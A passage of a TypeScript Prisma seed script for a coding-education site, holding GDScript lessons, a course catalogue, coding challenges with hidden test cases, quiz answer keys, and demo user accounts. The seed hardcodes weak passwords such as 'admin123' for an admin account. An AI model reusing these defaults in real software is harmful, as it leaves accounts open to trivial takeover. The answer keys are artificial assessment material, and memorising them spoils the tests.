      `**Signals** are Godot's event system, letting nodes communicate without directly knowing about each other, one of the most distinctive and important GDScript features to understand well.\n\n\`\`\`gdscript\n# Health.gd, attached to a Player node\nextends Node\n\nsignal health_depleted\nsignal health_changed(new_value)\n\nvar health := 100\n\nfunc take_damage(amount: int):\n    health -= amount\n    health_changed.emit(health)\n    if health <= 0:\n        health_depleted.emit()\n\`\`\`\n\n\`\`\`gdscript\n# UI.gd, attached to a completely separate HUD node\nfunc _ready():\n    var player = get_node("/root/Game/Player")\n    player.health_changed.connect(_on_health_changed)\n    player.health_depleted.connect(_on_player_died)\n\nfunc _on_health_changed(new_value):\n    print("Health is now: ", new_value)\n\nfunc _on_player_died():\n    print("Game over!")\n\`\`\`\n\n## Why signals instead of direct calls?\n\nThe \`Health\` script has **no idea** the UI even exists, it just \`emit\`s when something happens. The \`UI\` script \`connect\`s to those signals separately. This means the \`Player\`'s health logic and the \`HUD\`'s display logic are completely decoupled, you can add a second listener (a sound effect script, an achievement tracker) without touching \`Health.gd\` at all, and swap out the UI entirely without touching gameplay code.\n\nThis pattern (also called "observer" or "pub/sub" in other languages) is exactly why Godot projects tend to stay maintainable as they grow, systems talk *about* events, not directly *to* each other.`
    ),
    quiz: {
      title: 'Signals Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the main benefit of using signals instead of one script calling another directly?',
          options: ['Signals run faster than function calls', 'The emitting script does not need to know who, if anyone, is listening', 'Signals are required by the Godot compiler', 'Signals automatically save the game'],
          answer: 'The emitting script does not need to know who, if anyone, is listening',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A script must know exactly which other node will receive a signal before it can emit it.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'To trigger a signal named health_depleted, you call: health_depleted.____()',
          options: [],
          answer: 'emit',
        },
      ],
    },
  },
  {
    title: 'Node References and the Scene Tree',
    content: lessonContent(
      'Node References and the Scene Tree',
      `A script attached to one node very often needs to reach other nodes nearby in the scene tree, to read their state or call their methods.\n\n\`\`\`gdscript\nextends CharacterBody2D\n\n@onready var sprite = $Sprite2D\n@onready var collision_shape = $CollisionShape2D\n\nfunc _ready():\n    sprite.modulate = Color.RED\n\`\`\`\n\n\`$Sprite2D\` is shorthand for \`get_node("Sprite2D")\`, fetching a direct child node by name. \`@onready\` delays that lookup until the node has actually entered the scene tree, if you tried to grab \`$Sprite2D\` immediately when the script's variables are first declared, the child node might not exist yet.\n\n## Relative and absolute paths\n\n\`\`\`gdscript\nvar sibling = get_node("../Enemy")        # relative: up one level, then into Enemy\nvar anywhere = get_node("/root/Game/UI")  # absolute: from the very root of the tree\n\`\`\`\n\nRelative paths (\`\"..\"\` for parent, a name for a child) are more portable, since they don't break if the whole scene gets moved somewhere else in a larger tree, absolute paths are more explicit but brittle if the tree's structure changes.\n\n## Groups\n\nFor finding many unrelated nodes at once, node **groups** are usually cleaner than manual tree-walking:\n\n\`\`\`gdscript\n# In the editor, add each enemy node to a group called "enemies"\nfor enemy in get_tree().get_nodes_in_group("enemies"):\n    enemy.take_damage(10)\n\`\`\`\n\nGroups decouple "find all the enemies" from the tree's exact shape entirely, new enemies just need to join the group, no code elsewhere needs to change.`
    ),
    quiz: {
      title: 'Node References Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is $Sprite2D shorthand for?',
          options: ['A new Sprite2D instance', 'get_node("Sprite2D")', 'A global variable', 'An exported variable'],
          answer: 'get_node("Sprite2D")',
        },
        {
          type: 'TRUE_FALSE',
          prompt: '@onready delays a node lookup until the node has actually entered the scene tree.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Finding all nodes tagged with a shared label, like "enemies", without manually walking the tree, is done with node ____.',
          options: [],
          answer: 'groups',
        },
      ],
    },
  },
  {
    title: 'Classes and Inheritance',
    content: lessonContent(
      'Classes and Inheritance',
      `Beyond scripts attached directly to nodes, GDScript supports full custom classes, letting you define reusable data types and share behavior through inheritance.\n\n\`\`\`gdscript\n# item.gd\nclass_name Item\nextends Resource\n\n@export var name: String\n@export var value: int\n\nfunc describe() -> String:\n    return "%s (%d gold)" % [name, value]\n\`\`\`\n\n\`class_name Item\` registers this script as a globally-available type named \`Item\`, usable anywhere in the project without an explicit \`preload\`. Extending \`Resource\` (rather than a scene node type) makes it a reusable data asset, perfect for things like item definitions that don't need a position in the game world.\n\n## Inheriting your own classes\n\n\`\`\`gdscript\n# weapon.gd\nclass_name Weapon\nextends Item\n\n@export var damage: int\n\nfunc describe() -> String:\n    return super.describe() + " - %d damage" % damage\n\`\`\`\n\n\`Weapon extends Item\` inherits \`name\`, \`value\`, and the base \`describe()\`, then **overrides** \`describe()\` with its own version. \`super.describe()\` calls the parent class's original implementation first, then extends its result, rather than throwing it away entirely, a common pattern when a subclass wants to *add to* behavior instead of fully replacing it.\n\n\`\`\`gdscript\nvar sword = Weapon.new()\nsword.name = "Iron Sword"\nsword.value = 50\nsword.damage = 12\nprint(sword.describe())   # "Iron Sword (50 gold) - 12 damage"\n\`\`\``
    ),
    quiz: {
      title: 'Classes and Inheritance Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does class_name Item do?',
          options: ['Deletes the class', 'Registers the script as a globally-available type usable without preload', 'Makes the class private', 'Attaches the script to every node in the scene'],
          answer: 'Registers the script as a globally-available type usable without preload',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'super.describe() calls the parent class\'s original method instead of the overriding one.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A custom GDScript class inherits from another with the keyword: ____ Item',
          options: [],
          answer: 'extends',
        },
      ],
    },
  },
  {
    title: 'Final Project: Player Movement Script',
    content: lessonContent(
      'Final Project: Player Movement Script',
      `Combine everything from this course into a real, playable script: 2D platformer-style player movement, the foundation almost every 2D Godot game starts from.\n\n## Requirements\n\n1. Create a script extending \`CharacterBody2D\` with \`@export\` variables for \`speed\` and \`jump_velocity\`, tunable from the editor's Inspector.\n2. In \`_physics_process(delta)\`, read left/right input and set horizontal velocity accordingly (use \`Input.get_axis("ui_left", "ui_right")\` or your own custom input actions).\n3. Apply gravity to vertical velocity every frame, and let the player jump (set a negative vertical velocity) only when \`is_on_floor()\` is true, so jumping mid-air isn't possible.\n4. Call \`move_and_slide()\` to actually apply the computed velocity and handle collisions.\n5. Define a \`signal health_depleted\` and a simple \`health\` variable with a \`take_damage(amount)\` method that emits the signal when health reaches 0, connect to it from a separate script (even a simple one that just prints "Game Over") to prove the decoupling works.\n\n## Stretch goals\n\n- Add a \`Sprite2D\` reference and flip it horizontally based on movement direction.\n- Add a double-jump, allowed only once per airborne period.\n- Add a \`@export var coyote_time: float\` grace period that still allows a jump for a few frames after walking off a platform edge.\n\nSubmit a link to your finished project below, an instructor will review it before you can mark this lesson complete. Good luck!`
    ),
    requiresSubmission: true,
  },
];

const coursesByPath: Record<string, { title: string; description: string; lessons: SeedLesson[] }[]> = {
  nodejs: [
    {
      title: 'Node.js Backend Fundamentals',
      description: 'From your first console.log to a deployed REST API with authentication, the complete Node.js foundation.',
      lessons: nodeLessons,
    },
  ],
  python: [
    {
      title: 'Python for Absolute Beginners',
      description: 'Learn programming from zero with the most beginner-friendly language in the world.',
      lessons: pythonLessons,
    },
    {
      title: 'MongoDB with FastAPI & Python',
      description:
        'Build a real, async REST API with FastAPI and MongoDB: Pydantic models, CRUD with Motor, and a full backend project.',
      lessons: mongoFastApiLessons,
    },
    {
      title: 'Build Asteroids using Python and Pygame',
      description:
        "Build a clone of the classic Asteroids game using Pygame and object-oriented programming concepts. This guided project will help you understand how to use Pygame to create a game loop, handle user input, and manage game state. You'll also learn how to use object-oriented programming to create game objects and manage their interactions.",
      lessons: pygameAsteroidsLessons,
    },
  ],
  javascript: [
    {
      title: 'Modern JavaScript Essentials',
      description: 'DOM manipulation, array methods, and async programming, everything the modern web is built on.',
      lessons: jsLessons,
    },
  ],
  typescript: [
    {
      title: 'TypeScript from JavaScript',
      description: 'Level up your JavaScript with static types, interfaces, and compiler-driven confidence.',
      lessons: tsLessons,
    },
  ],
  cpp: [
    {
      title: 'C++ Foundations',
      description: 'Compiled programming, pointers, and memory, the bedrock of systems development.',
      lessons: cppLessons,
    },
  ],
  git: [
    {
      title: 'Git & Version Control Fundamentals',
      description:
        'Learn to track changes, branch, merge, and collaborate on code using Git, the version control system behind virtually every modern software project.',
      lessons: gitLessons,
    },
  ],
  react: [
    {
      title: 'React Fundamentals',
      description: 'Component-based UI development with React, JSX, props, state, hooks, and building real interactive apps.',
      lessons: reactLessons,
    },
    {
      title: 'React-Expo',
      description: 'Take React from the browser to your phone: build real mobile apps with Expo, file-based navigation, native device APIs, and ship a build with EAS.',
      lessons: expoLessons,
    },
  ],
  csharp: [
    {
      title: 'C# Foundations',
      description: 'Learn statically-typed, object-oriented programming with C# and the .NET ecosystem, from your first program to building console applications.',
      lessons: csharpLessons,
    },
  ],
  sql: [
    {
      title: 'SQL Fundamentals',
      description: 'Learn to query, filter, join, and aggregate data with SQL, the standard language for relational databases.',
      lessons: sqlLessons,
    },
    {
      title: 'Node.js, Prisma & PostgreSQL',
      description:
        'Go from raw SQL to a real, type-safe backend: model your data with Prisma, migrate a PostgreSQL database, and query it from a Node.js application.',
      lessons: nodePrismaLessons,
    },
  ],
  devops: [
    {
      title: 'Docker Fundamentals',
      description: 'Package, ship, and run applications anywhere with containers, images, Dockerfiles, and Docker Compose.',
      lessons: dockerLessons,
    },
    {
      title: 'Azure Fundamentals',
      description: 'Deploy, host, and scale real applications in the cloud with Microsoft Azure.',
      lessons: azureLessons,
    },
    {
      title: 'Kubernetes Fundamentals',
      description: 'Orchestrate containers at scale: Pods, Deployments, Services, config and storage, and real kubectl workflows.',
      lessons: kubernetesLessons,
    },
    {
      title: 'AWS Fundamentals',
      description: 'Regions and IAM, EC2, S3, VPC networking, and serverless with Lambda and API Gateway.',
      lessons: awsLessons,
    },
    {
      title: 'CI/CD Fundamentals',
      description: 'Build real pipelines with GitHub Actions: automated testing, Docker image builds, deployment strategies, and pipeline secrets.',
      lessons: cicdLessons,
    },
    {
      title: 'Logging and Observability',
      description: 'The three pillars of observability: structured logging, metrics and time-series data, distributed tracing, and alerting that does not burn out your team.',
      lessons: observabilityLessons,
    },
  ],
  'ai-coding': [
    {
      title: 'Prompt Engineering & Vibe Coding',
      description:
        'What to think about before, during, and after using an AI coding assistant: writing effective prompts, giving the right context, and reviewing what it builds.',
      lessons: promptEngineeringLessons,
    },
  ],
  html: [
    {
      title: 'HTML Foundations',
      description: 'The building blocks of every website: structure, semantics, forms, and accessibility with HTML.',
      lessons: htmlLessons,
    },
  ],
  css: [
    {
      title: 'CSS Foundations',
      description: 'Style and lay out the web: the box model, Flexbox, Grid, responsive design, and animation with CSS.',
      lessons: cssLessons,
    },
  ],
  lua: [
    {
      title: 'Lua Fundamentals',
      description: 'A lightweight, embeddable scripting language: variables, tables, functions, and metatables, from your first script to a text adventure.',
      lessons: luaLessons,
    },
    {
      title: 'Lua Intermediate: OOP, Closures & Patterns',
      description: 'Go beyond the basics: closures and private state, full class hierarchies with inheritance, Lua string patterns, and proper error handling with pcall/xpcall.',
      lessons: luaIntermediateLessons,
    },
    {
      title: 'Lua Advanced: Coroutines, Metamethods & Performance',
      description: 'Cooperative multitasking with coroutines, operator overloading and __call/__newindex, variadic functions, and garbage collection with weak tables.',
      lessons: luaAdvancedLessons,
    },
  ],
  cybersecurity: [
    {
      title: 'Cybersecurity Fundamentals',
      description: 'Think like an attacker to defend like a pro: the CIA triad, common attack vectors, network and web app security, cryptography, and access control.',
      lessons: cybersecurityLessons,
    },
  ],
  c: [
    {
      title: 'C Programming',
      description: 'Get close to the machine: structs, pointers, manual memory management, and build your own garbage collector from scratch.',
      lessons: cLessons,
    },
  ],
  linux: [
    {
      title: 'Linux Fundamentals',
      description: 'The command line, filesystems, processes, permissions, and setting up a real development environment.',
      lessons: linuxLessons,
    },
  ],
  java: [
    {
      title: 'Java Foundations',
      description: 'Statically-typed, object-oriented programming on the JVM: classes, collections, generics, and interfaces.',
      lessons: javaLessons,
    },
  ],
  go: [
    {
      title: 'Go Fundamentals',
      description: 'A simple, fast, compiled language built for concurrency: structs, goroutines, channels, and error handling.',
      lessons: goLessons,
    },
  ],
  solidity: [
    {
      title: 'Solidity Fundamentals',
      description: 'Write smart contracts for Ethereum: state variables, functions and visibility, access control, mappings, and events.',
      lessons: solidityLessons,
    },
  ],
  gdscript: [
    {
      title: 'GDScript Fundamentals',
      description: "Godot's built-in scripting language: nodes, the scene tree, signals, and building real gameplay behavior.",
      lessons: gdscriptLessons,
    },
  ],
};

type SeedTestCase = { input: unknown[]; expectedOutput: unknown; isHidden: boolean };

type SeedChallenge = {
  slug: string;
  title: string;
  difficulty: ChallengeDifficulty;
  languages: ChallengeLanguage[];
  prompt: string;
  entryPoint: string;
  starterCode: Partial<Record<'python' | 'javascript' | 'typescript' | 'lua' | 'html', string>>;
  testCases: SeedTestCase[];
  /** true = attributed to the demo instructor account instead of being a built-in challenge */
  instructorAuthored?: boolean;
};

const ALL_LANGS: ChallengeLanguage[] = ['PYTHON', 'JAVASCRIPT', 'TYPESCRIPT'];

const challenges: SeedChallenge[] = [
  {
    slug: 'sum-two-numbers',
    title: 'Sum Two Numbers',
    difficulty: 'EASY',
    languages: ALL_LANGS,
    prompt: 'Write `solve(a, b)` that returns the sum of two numbers.',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(a, b):\n    pass\n',
      javascript: 'function solve(a, b) {\n  \n}\n',
      typescript: 'function solve(a: number, b: number): number {\n  \n}\n',
    },
    testCases: [
      { input: [2, 3], expectedOutput: 5, isHidden: false },
      { input: [-1, 1], expectedOutput: 0, isHidden: false },
      { input: [100, 250], expectedOutput: 350, isHidden: true },
    ],
  },
  {
    slug: 'reverse-a-string',
    title: 'Reverse a String',
    difficulty: 'EASY',
    languages: ALL_LANGS,
    prompt: 'Write `solve(s)` that returns the string `s` reversed.',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(s):\n    pass\n',
      javascript: 'function solve(s) {\n  \n}\n',
      typescript: 'function solve(s: string): string {\n  \n}\n',
    },
    testCases: [
      { input: ['hello'], expectedOutput: 'olleh', isHidden: false },
      { input: ['a'], expectedOutput: 'a', isHidden: false },
      { input: ['Kodstigen'], expectedOutput: 'negitsdoK', isHidden: true },
    ],
  },
  {
    slug: 'count-vowels',
    title: 'Count Vowels',
    difficulty: 'EASY',
    languages: ALL_LANGS,
    prompt: 'Write `solve(s)` that returns the number of vowels (a, e, i, o, u, case-insensitive) in `s`.',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(s):\n    pass\n',
      javascript: 'function solve(s) {\n  \n}\n',
      typescript: 'function solve(s: string): number {\n  \n}\n',
    },
    testCases: [
      { input: ['hello'], expectedOutput: 2, isHidden: false },
      { input: ['sky'], expectedOutput: 0, isHidden: false },
      { input: ['Programming'], expectedOutput: 3, isHidden: true },
    ],
  },
  {
    slug: 'find-the-maximum',
    title: 'Find the Maximum',
    difficulty: 'EASY',
    languages: ALL_LANGS,
    prompt: 'Write `solve(nums)` that returns the largest number in the list `nums`.',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(nums):\n    pass\n',
      javascript: 'function solve(nums) {\n  \n}\n',
      typescript: 'function solve(nums: number[]): number {\n  \n}\n',
    },
    testCases: [
      { input: [[1, 5, 3]], expectedOutput: 5, isHidden: false },
      { input: [[-2, -5, -1]], expectedOutput: -1, isHidden: false },
      { input: [[42]], expectedOutput: 42, isHidden: true },
    ],
  },
  {
    slug: 'fizzbuzz-list',
    title: 'FizzBuzz List',
    difficulty: 'MEDIUM',
    languages: ALL_LANGS,
    prompt:
      'Write `solve(n)` that returns a list of strings for the numbers 1 to `n` (inclusive): "Fizz" for multiples of 3, "Buzz" for multiples of 5, "FizzBuzz" for multiples of both, otherwise the number as a string.',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(n):\n    pass\n',
      javascript: 'function solve(n) {\n  \n}\n',
      typescript: 'function solve(n: number): string[] {\n  \n}\n',
    },
    testCases: [
      { input: [5], expectedOutput: ['1', '2', 'Fizz', '4', 'Buzz'], isHidden: false },
      { input: [3], expectedOutput: ['1', '2', 'Fizz'], isHidden: false },
      {
        input: [15],
        expectedOutput: [
          '1', '2', 'Fizz', '4', 'Buzz', 'Fizz', '7', '8', 'Fizz', 'Buzz', '11', 'Fizz', '13', '14', 'FizzBuzz',
        ],
        isHidden: true,
      },
    ],
  },
  {
    slug: 'is-palindrome',
    title: 'Is Palindrome',
    difficulty: 'MEDIUM',
    languages: ALL_LANGS,
    prompt: 'Write `solve(s)` that returns `true` if `s` reads the same forwards and backwards, `false` otherwise.',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(s):\n    pass\n',
      javascript: 'function solve(s) {\n  \n}\n',
      typescript: 'function solve(s: string): boolean {\n  \n}\n',
    },
    testCases: [
      { input: ['level'], expectedOutput: true, isHidden: false },
      { input: ['hello'], expectedOutput: false, isHidden: false },
      { input: ['A'], expectedOutput: true, isHidden: true },
    ],
  },
  {
    slug: 'two-sum-indices',
    title: 'Two Sum Indices',
    difficulty: 'MEDIUM',
    languages: ALL_LANGS,
    prompt:
      'Write `solve(nums, target)` that returns the indices `[i, j]` (i < j) of the two numbers in `nums` that add up to `target`. Assume exactly one solution exists.',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(nums, target):\n    pass\n',
      javascript: 'function solve(nums, target) {\n  \n}\n',
      typescript: 'function solve(nums: number[], target: number): number[] {\n  \n}\n',
    },
    testCases: [
      { input: [[2, 7, 11, 15], 9], expectedOutput: [0, 1], isHidden: false },
      { input: [[3, 2, 4], 6], expectedOutput: [1, 2], isHidden: false },
      { input: [[1, 5, 3, 7], 10], expectedOutput: [2, 3], isHidden: true },
    ],
  },
  {
    slug: 'fibonacci-number',
    title: 'Fibonacci Number',
    difficulty: 'MEDIUM',
    languages: ALL_LANGS,
    prompt: 'Write `solve(n)` that returns the `n`th Fibonacci number (0-indexed: fib(0) = 0, fib(1) = 1).',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(n):\n    pass\n',
      javascript: 'function solve(n) {\n  \n}\n',
      typescript: 'function solve(n: number): number {\n  \n}\n',
    },
    testCases: [
      { input: [0], expectedOutput: 0, isHidden: false },
      { input: [1], expectedOutput: 1, isHidden: false },
      { input: [10], expectedOutput: 55, isHidden: true },
    ],
  },
  {
    slug: 'valid-anagram',
    title: 'Valid Anagram',
    difficulty: 'HARD',
    languages: ALL_LANGS,
    prompt: 'Write `solve(s1, s2)` that returns `true` if `s2` is an anagram of `s1` (same letters, same counts), `false` otherwise.',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(s1, s2):\n    pass\n',
      javascript: 'function solve(s1, s2) {\n  \n}\n',
      typescript: 'function solve(s1: string, s2: string): boolean {\n  \n}\n',
    },
    testCases: [
      { input: ['listen', 'silent'], expectedOutput: true, isHidden: false },
      { input: ['rat', 'car'], expectedOutput: false, isHidden: false },
      { input: ['anagram', 'nagaram'], expectedOutput: true, isHidden: true },
    ],
  },
  {
    slug: 'binary-search',
    title: 'Binary Search',
    difficulty: 'HARD',
    languages: ALL_LANGS,
    prompt: 'Write `solve(nums, target)` that returns the index of `target` in the sorted list `nums`, or `-1` if it is not present.',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(nums, target):\n    pass\n',
      javascript: 'function solve(nums, target) {\n  \n}\n',
      typescript: 'function solve(nums: number[], target: number): number {\n  \n}\n',
    },
    testCases: [
      { input: [[1, 3, 5, 7, 9], 5], expectedOutput: 2, isHidden: false },
      { input: [[1, 3, 5, 7, 9], 4], expectedOutput: -1, isHidden: false },
      { input: [[2, 4, 6, 8, 10, 12], 12], expectedOutput: 5, isHidden: true },
    ],
  },
  {
    slug: 'lua-table-sum',
    title: 'Lua: Table Sum',
    difficulty: 'EASY',
    languages: ['LUA'],
    prompt: 'Write `solve(nums)` that returns the sum of all numbers in the Lua table `nums`.',
    entryPoint: 'solve',
    starterCode: {
      lua: 'function solve(nums)\n  \nend\n',
    },
    testCases: [
      { input: [[1, 2, 3]], expectedOutput: 6, isHidden: false },
      { input: [[10, -2, 5]], expectedOutput: 13, isHidden: false },
      { input: [[100, 250, -50]], expectedOutput: 300, isHidden: true },
    ],
    instructorAuthored: true,
  },
  {
    slug: 'lua-word-count',
    title: 'Lua: Word Count',
    difficulty: 'MEDIUM',
    languages: ['LUA'],
    prompt:
      'Write `solve(s)` that returns the number of whitespace-separated words in the string `s`. Use a Lua pattern with `gmatch` rather than splitting on a single space, so runs of extra whitespace don\'t produce empty "words".',
    entryPoint: 'solve',
    starterCode: {
      lua: 'function solve(s)\n  \nend\n',
    },
    testCases: [
      { input: ['hello world'], expectedOutput: 2, isHidden: false },
      { input: ['Lua is fun'], expectedOutput: 3, isHidden: false },
      { input: ['   spaced   out   '], expectedOutput: 2, isHidden: true },
    ],
    instructorAuthored: true,
  },
  {
    slug: 'html-build-a-heading',
    title: 'HTML: Build a Heading',
    difficulty: 'EASY',
    languages: ['HTML'],
    prompt:
      'Write HTML markup containing a single `<h1>` element whose text is exactly "Hello, Kodstigen!".\n\nHTML challenges aren\'t graded by calling a function - each test case checks something about the rendered markup instead (does an element exist, what text does it contain, how many are there).',
    entryPoint: 'render',
    starterCode: {
      html: '<!-- Write your HTML here -->\n<h1></h1>\n',
    },
    testCases: [
      { input: [{ selector: 'h1', extract: 'exists' }], expectedOutput: true, isHidden: false },
      { input: [{ selector: 'h1', extract: 'text' }], expectedOutput: 'Hello, Kodstigen!', isHidden: false },
      { input: [{ selector: 'h1', extract: 'count' }], expectedOutput: 1, isHidden: true },
    ],
    instructorAuthored: true,
  },
  {
    slug: 'html-build-a-nav-list',
    title: 'HTML: Build a Nav List',
    difficulty: 'MEDIUM',
    languages: ['HTML'],
    prompt:
      'Write HTML markup for a navigation list: a `<ul class="nav-list">` containing exactly 3 `<li>` elements, each wrapping an `<a>` link.',
    entryPoint: 'render',
    starterCode: {
      html: '<!-- Build your nav list here -->\n',
    },
    testCases: [
      { input: [{ selector: 'ul.nav-list', extract: 'exists' }], expectedOutput: true, isHidden: false },
      { input: [{ selector: 'ul.nav-list li', extract: 'count' }], expectedOutput: 3, isHidden: false },
      { input: [{ selector: 'ul.nav-list li a', extract: 'count' }], expectedOutput: 3, isHidden: true },
    ],
    instructorAuthored: true,
  },
];

const achievements: {
  key: string;
  name: string;
  description: string;
  icon: string;
  metric: AchievementMetric;
  threshold: number;
}[] = [
  { key: 'first_lesson', name: 'First Steps', description: 'Complete your first lesson.', icon: '📘', metric: 'LESSONS_COMPLETED', threshold: 1 },
  { key: 'lessons_10', name: 'Halfway Hero', description: 'Complete 10 lessons.', icon: '📚', metric: 'LESSONS_COMPLETED', threshold: 10 },
  { key: 'first_quiz', name: 'Quiz Whiz', description: 'Pass your first quiz.', icon: '📝', metric: 'QUIZZES_PASSED', threshold: 1 },
  { key: 'quizzes_10', name: 'Quiz Master', description: 'Pass 10 quizzes.', icon: '🧠', metric: 'QUIZZES_PASSED', threshold: 10 },
  { key: 'first_challenge', name: 'Code Warrior', description: 'Solve your first coding challenge.', icon: '💻', metric: 'CHALLENGES_SOLVED', threshold: 1 },
  { key: 'challenges_5', name: 'Challenge Crusher', description: 'Solve 5 coding challenges.', icon: '🏆', metric: 'CHALLENGES_SOLVED', threshold: 5 },
  { key: 'challenges_10', name: 'Challenge Champion', description: 'Solve 10 coding challenges.', icon: '👑', metric: 'CHALLENGES_SOLVED', threshold: 10 },
  { key: 'xp_100', name: 'XP Rookie', description: 'Earn 100 XP.', icon: '⚡', metric: 'XP', threshold: 100 },
  { key: 'xp_500', name: 'XP Grinder', description: 'Earn 500 XP.', icon: '⚡', metric: 'XP', threshold: 500 },
  { key: 'xp_1000', name: 'XP Legend', description: 'Earn 1000 XP.', icon: '🌟', metric: 'XP', threshold: 1000 },
  { key: 'streak_3', name: 'On Fire', description: 'Reach a 3-day streak.', icon: '🔥', metric: 'STREAK', threshold: 3 },
  { key: 'streak_7', name: 'Unstoppable', description: 'Reach a 7-day streak.', icon: '🔥', metric: 'STREAK', threshold: 7 },
];

async function seedChallenges(instructorId: string) {
  for (const [i, c] of challenges.entries()) {
    const owner = c.instructorAuthored ? instructorId : null;
    const existing = await prisma.challenge.findUnique({ where: { slug: c.slug } });
    if (existing) {
      await prisma.challenge.update({
        where: { slug: c.slug },
        data: {
          title: c.title,
          difficulty: c.difficulty,
          languages: c.languages,
          prompt: c.prompt,
          order: i,
          status: 'PUBLISHED',
          instructorId: owner,
        },
      });
      continue;
    }
    await prisma.challenge.create({
      data: {
        slug: c.slug,
        title: c.title,
        difficulty: c.difficulty,
        languages: c.languages,
        prompt: c.prompt,
        entryPoint: c.entryPoint,
        starterCode: c.starterCode,
        order: i,
        status: 'PUBLISHED',
        instructorId: owner,
        testCases: {
          create: c.testCases.map((tc, ti) => ({
            input: tc.input as Prisma.InputJsonValue,
            expectedOutput: tc.expectedOutput as Prisma.InputJsonValue,
            isHidden: tc.isHidden,
            order: ti,
          })),
        },
      },
    });
  }
  console.log(`  ✓ ${challenges.length} coding challenges`);
}

async function seedAchievements() {
  for (const a of achievements) {
    await prisma.achievement.upsert({ where: { key: a.key }, update: a, create: a });
  }
  console.log(`  ✓ ${achievements.length} achievements`);
}

async function main() {
  console.log('Seeding Kodstigen...');

  const [instructorPass, adminPass, studentPass] = await Promise.all([
    bcrypt.hash('instructor123', 10),
    bcrypt.hash('admin123', 10),
    bcrypt.hash('student123', 10),
  ]);

  const instructor = await prisma.user.upsert({
    where: { email: 'instructor@codeforge.dev' },
    update: { emailVerified: true },
    create: {
      username: 'ada_instructor',
      email: 'instructor@codeforge.dev',
      passwordHash: instructorPass,
      role: 'INSTRUCTOR',
      bio: 'Senior engineer teaching backend development.',
      emailVerified: true,
    },
  });

  await prisma.user.upsert({
    where: { email: 'admin@codeforge.dev' },
    update: { emailVerified: true },
    create: {
      username: 'admin',
      email: 'admin@codeforge.dev',
      passwordHash: adminPass,
      role: 'ADMIN',
      emailVerified: true,
    },
  });

  await prisma.user.upsert({
    where: { email: 'student@codeforge.dev' },
    update: { emailVerified: true },
    create: {
      username: 'demo_student',
      email: 'student@codeforge.dev',
      passwordHash: studentPass,
      role: 'STUDENT',
      emailVerified: true,
    },
  });

  for (const p of paths) {
    const path = await prisma.learningPath.upsert({
      where: { slug: p.slug },
      update: p,
      create: p,
    });

    if (p.slug === 'devops') {
      // Docker and Azure used to be their own standalone paths; fold their existing courses
      // (and any real enrollments/progress/certificates already on them) into DevOps instead
      // of recreating them, then remove the now-empty standalone path.
      for (const oldSlug of ['docker', 'azure']) {
        const oldPath = await prisma.learningPath.findUnique({ where: { slug: oldSlug } });
        if (!oldPath) continue;
        await prisma.course.updateMany({ where: { pathId: oldPath.id }, data: { pathId: path.id } });
        await prisma.learningPath.delete({ where: { id: oldPath.id } });
        console.log(`  ↳ moved "${oldSlug}" courses into devops, removed the standalone "${oldSlug}" path`);
      }
    }

    for (const courseSeed of coursesByPath[p.slug] ?? []) {
      const existing = await prisma.course.findFirst({ where: { pathId: path.id, title: courseSeed.title } });
      if (existing) {
        // refresh lesson text in place so content updates reach existing installs
        // without touching quizzes, enrollments, or student progress; lessons newly
        // added to the seed (beyond what already exists) are created with their quiz
        const current = await prisma.lesson.findMany({ where: { courseId: existing.id } });
        const byOrder = new Map(current.map((l) => [l.order, l]));
        for (const [i, lesson] of courseSeed.lessons.entries()) {
          const order = i + 1;
          const match = byOrder.get(order);
          if (match) {
            await prisma.lesson.update({
              where: { id: match.id },
              data: { title: lesson.title, content: lesson.content, requiresSubmission: lesson.requiresSubmission ?? false },
            });
          } else {
            await prisma.lesson.create({
              data: {
                courseId: existing.id,
                title: lesson.title,
                order,
                content: lesson.content,
                videoUrl: lesson.videoUrl ?? null,
                requiresSubmission: lesson.requiresSubmission ?? false,
                quiz: lesson.quiz
                  ? {
                      create: {
                        title: lesson.quiz.title,
                        passingScore: lesson.quiz.passingScore,
                        questions: {
                          create: lesson.quiz.questions.map((q, qi) => ({
                            type: q.type,
                            prompt: q.prompt,
                            options: q.options,
                            answer: q.answer,
                            order: qi + 1,
                          })),
                        },
                      },
                    }
                  : undefined,
              },
            });
          }
        }
        console.log(`  ✓ ${courseSeed.title} (content refreshed, ${courseSeed.lessons.length} lessons)`);
        continue;
      }

      await prisma.course.create({
        data: {
          title: courseSeed.title,
          description: courseSeed.description,
          status: 'PUBLISHED',
          pathId: path.id,
          instructorId: instructor.id,
          lessons: {
            create: courseSeed.lessons.map((lesson, i) => ({
              title: lesson.title,
              order: i + 1,
              content: lesson.content,
              videoUrl: lesson.videoUrl ?? null,
              requiresSubmission: lesson.requiresSubmission ?? false,
              quiz: lesson.quiz
                ? {
                    create: {
                      title: lesson.quiz.title,
                      passingScore: lesson.quiz.passingScore,
                      questions: {
                        create: lesson.quiz.questions.map((q, qi) => ({
                          type: q.type,
                          prompt: q.prompt,
                          options: q.options,
                          answer: q.answer,
                          order: qi + 1,
                        })),
                      },
                    },
                  }
                : undefined,
            })),
          },
        },
      });
      console.log(`  ✓ ${courseSeed.title} (${courseSeed.lessons.length} lessons)`);
    }
  }

  await seedChallenges(instructor.id);
  await seedAchievements();

  const chatCount = await prisma.chatMessage.count();
  if (chatCount === 0) {
    const [admin, student] = await Promise.all([
      prisma.user.findUniqueOrThrow({ where: { email: 'admin@codeforge.dev' } }),
